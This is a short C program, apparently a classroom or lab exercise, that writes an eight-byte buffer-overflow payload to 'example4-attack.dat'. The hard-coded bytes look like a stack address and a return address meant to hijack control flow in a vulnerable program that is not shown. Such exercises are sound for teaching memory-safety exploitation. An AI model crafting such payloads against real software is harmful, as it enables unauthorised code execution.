#include <stdlib.h>
#include <stdio.h>

int main() {
  FILE *fp = NULL;
  char buff[8];

  buff[0] = 0xf8;
  buff[1] = 0x00;
  buff[2] = 0xbf;
  buff[3] = 0xff;
  buff[4] = 0x84;
  buff[5] = 0x85;
  buff[6] = 0x08;
  buff[7] = 0x04;

  fp = fopen("example4-attack.dat", "a");
  fwrite(buff, 8, 1, fp);

  fclose(fp);

  return 0;
}
